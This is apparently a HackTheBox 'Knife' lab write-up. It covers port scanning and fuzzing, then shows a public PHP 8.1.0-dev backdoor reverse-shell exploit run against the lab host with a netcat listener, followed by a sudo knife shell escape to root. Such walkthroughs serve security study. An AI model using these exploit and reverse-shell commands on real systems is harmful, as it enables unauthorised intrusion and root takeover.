---
icon: knife-kitchen
---

# HTB-KNIFE

<figure><img src="../../../../.gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>

Enumeration :

```jsx
                                                                                                                                                          
┌──(sn0x㉿sn0x)-[~/HTB/knife]
└─$ rustscan -a 10.10.10.242 --ulimit 5000 --range 1-10000 -- -sCV -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |
| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: <https://discord.gg/GFrQsGy>           :
: <https://github.com/RustScan/RustScan> :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/sn0x/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.242:22
Open 10.10.10.242:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjEtN3+WZzlvu54zya9Q+D0d/jwjZT2jYFKwHe0icY7plEWSAqbP+b3ijRL6kv522KEJPHkfXuRwzt5z4CNpyUnqr6nQINn8DU0Iu/UQby+6OiQIleNUCYYaI+1mV0sm4kgmue4oVI1Q3JYOH41efTbGDFHiGSTY1lH3HcAvOFh75dCID0564T078p7ZEIoKRt1l7Yz+GeMZ870Nw13ao0QLPmq2HnpQS34K45zU0lmxIHqiK/IpFJOLfugiQF52Qt6+gX3FOjPgxk8rk81DEwicTrlir2gJiizAOchNPZjbDCnG2UqTapOm292Xg0hCE6H03Ri6GtYs5xVFw/KfGSGb7OJT1jhitbpUxRbyvP+pFy4/8u6Ty91s98bXrCyaEy2lyZh5hm7MN2yRsX+UbrSo98UfMbHkKnePg7/oBhGOOrUb77/DPePGeBF5AT029Xbz90v2iEFfPdcWj8SP/p2Fsn/qdutNQ7cRnNvBVXbNm0CpiNfoHBCBDJ1LR8p8k=
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGKC3ouVMPI/5R2Fsr5b0uUQGDrAa6ev8uKKp5x8wdqPXvM1tr4u0GchbVoTX5T/PfJFi9UpeDx/uokU3chqcFc=
|   256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJbkxEqMn++HZ2uEvM0lDZy+TB8B8IAeWRBEu3a34YIb
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Fuzzing

```jsx
──(sn0x㉿sn0x)-[~/HTB/knife]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u <http://10.10.10.242/FUZZ> -e .php

        /'___\\  /'___\\           /'___\\       
       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       
       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      
        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      
         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       
          \\/_/    \\/_/   \\/___/    \\/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : <http://10.10.10.242/FUZZ>
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

#                       [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 226ms]
# license, visit <http://creativecommons.org/licenses/by-sa/3.0/.php> [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 266ms]
# Priority-ordered case-insensitive list, where entries were found [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 269ms]
#.php                   [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 270ms]
index.php               [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 272ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 274ms]
# Attribution-Share Alike 3.0 License. To view a copy of this.php [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 274ms]
# Copyright 2007 James Fisher.php [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 276ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 277ms]
#.php                   [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 279ms]
#                       [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 280ms]
# Suite 300, San Francisco, California, 94105, USA..php [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 270ms]
# on at least 2 different hosts.php [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 277ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 280ms]
                        [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 281ms]
# Priority-ordered case-insensitive list, where entries were found.php [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 281ms]
#.php                   [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 281ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 290ms]
# directory-list-lowercase-2.3-medium.txt.php [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 281ms]
#                       [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 281ms]
# This work is licensed under the Creative Commons.php [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 290ms]
# directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 276ms]
#.php                   [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 281ms]
# Copyright 2007 James Fisher [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 277ms]
# on at least 2 different hosts [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 281ms]
# license, visit <http://creativecommons.org/licenses/by-sa/3.0/> [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 281ms]
#                       [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 281ms]
# or send a letter to Creative Commons, 171 Second Street,.php [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 281ms]
                        [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 226ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 235ms]

```

Website i found :

<figure><img src="../../../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>

Nikto Scan we found : **`PHP/8.1.0-dev.`**

```jsx
┌──(sn0x㉿sn0x)-[~/HTB/knife]
└─$ nikto -h <http://10.10.10.242>      
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.10.242
+ Target Hostname:    10.10.10.242
+ Target Port:        80
+ Start Time:         2025-07-05 13:56:02 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: Retrieved x-powered-by header: **PHP/8.1.0-dev.**
+ /: The anti-clickjacking X-Frame-Options header is not present. See: <https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options>
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: <https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/>
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
<http://10.10.10.242/-> STATUS: Completed 3000 requests (~43% complete, 15.7 minutes left): currently in plugin 'Nikto Tests'

```

Found this github repo : [https://github.com/flast101/php-8.1.0-dev-backdoor-rce](https://github.com/flast101/php-8.1.0-dev-backdoor-rce)

<figure><img src="../../../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>

run this script against target:

```jsx
┌──(sn0x㉿sn0x)-[~/Downloads]
└─$ python3 revshell_php_8.1.0-dev.py <http://10.10.10.242/> 10.10.14.12 4444
```

Listner We got shell !!

```jsx
┌──(sn0x㉿sn0x)-[~/Downloads]
└─$ nc -nvlp 4444 
listening on [any] 4444 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.242] 52396
bash: cannot set terminal process group (1044): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ ls
james@knife:/home$ ls
ls
james
james@knife:/home$ cd james
cd james
james@knife:~$ ls
ls
user.txt
james@knife:~$ cat user.txt
cat user.txt
8f6c598ee289078c9b944f06b5d874fb

```

Privesec :

```jsx
jamjames@knife:~$ sudo -l
sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin
    
    User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife

```

gtfobins we found knife tool bypass command

<figure><img src="../../../../.gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>

```jsx
james@knife:~$ sudo knife exec -E 'exec "/bin/sh"'

whoami
root
cd root
/bin/sh: 5: cd: can't cd to root
cd /root
cat root.txt
a919debe2bb33847a7b54b7ed4384a74

```

machine is rooted !

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
